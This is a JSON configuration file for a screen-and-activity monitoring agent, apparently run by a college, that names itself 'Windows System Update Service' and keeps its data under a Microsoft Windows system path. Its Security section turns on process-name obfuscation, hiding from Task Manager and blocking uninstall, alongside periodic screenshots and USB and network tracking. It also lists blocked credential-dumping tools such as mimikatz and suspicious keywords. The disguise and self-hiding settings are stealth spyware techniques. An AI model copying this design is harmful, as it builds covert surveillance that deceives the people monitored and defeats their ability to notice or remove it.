{
  "Service": {
    "Name": "WinSysUpdate",
    "DisplayName": "Windows System Update Service",
    "Description": "Manages Windows system updates and security health monitoring",
    "ServiceName": "WinSysUpdate"
  },
  "Server": {
    "BaseUrl": "https://monitor.college.edu/api",
    "WebSocketUrl": "wss://monitor.college.edu/ws",
    "ApiKey": "",
    "ClientCertificatePath": "",
    "ClientCertificatePassword": "",
    "ValidateServerCertificate": true,
    "ConnectionTimeoutSeconds": 30,
    "ReconnectIntervalSeconds": 60,
    "MaxReconnectAttempts": 10
  },
  "Monitoring": {
    "HeartbeatIntervalSeconds": 30,
    "ScreenshotIntervalSeconds": 300,
    "MaxScreenshotsPerHour": 50,
    "CaptureOnWindowChange": true,
    "CaptureOnTrigger": true,
    "SuspiciousKeywords": [
      "hack", "crack", "serial key", "keygen", "password stealer",
      "keylogger", "ransomware", "malware", "exploit", "vulnerability",
      "bypass", "inject", "rootkit", "backdoor", "trojan", "botnet",
      "ddos", "phishing", "spoof", "sniff", "brute force", "dictionary attack"
    ],
    "BlockedProcesses": [
      "mimikatz", "pwdump", "fgdump", "cachedump", "lsadump",
      "procdump", "sqldumper", "wce", "gsecdump", "sekurlsa"
    ],
    "BlockedUrls": [
      "*.onion", "pastebin.com/raw/", "github.com/*/raw/",
      "raw.githubusercontent.com/", "*.malware*", "*.phishing*"
    ],
    "MonitorUsb": true,
    "MonitorClipboard": false,
    "MonitorPrintJobs": false,
    "MonitorNetworkConnections": true,
    "FailedLoginThreshold": 3,
    "FailedLoginWindowMinutes": 15,
    "RiskScoreAlertThreshold": 50
  },
  "Storage": {
    "LocalDbPath": "C:\\ProgramData\\Microsoft\\Windows\\WinSysUpdate\\monitor.db",
    "ScreenshotPath": "C:\\ProgramData\\Microsoft\\Windows\\WinSysUpdate\\screenshots\\",
    "MaxLocalStorageMB": 500,
    "ScreenshotRetentionDays": 30,
    "ActivityLogRetentionDays": 90,
    "CompressScreenshots": true,
    "ScreenshotQuality": 80
  },
  "Security": {
    "EncryptLocalDb": true,
    "EncryptScreenshots": true,
    "EncryptNetworkPayloads": true,
    "ObfuscateProcessName": true,
    "HideFromTaskManager": true,
    "PreventUninstall": true,
    "WatchdogEnabled": true,
    "IntegrityCheckIntervalMinutes": 15
  },
  "Logging": {
    "LogLevel": "Information",
    "LogToEventLog": true,
    "LogToFile": false,
    "LogFilePath": "C:\\ProgramData\\Microsoft\\Windows\\WinSysUpdate\\logs\\",
    "MaxLogFileSizeMB": 10,
    "MaxLogFiles": 5
  }
}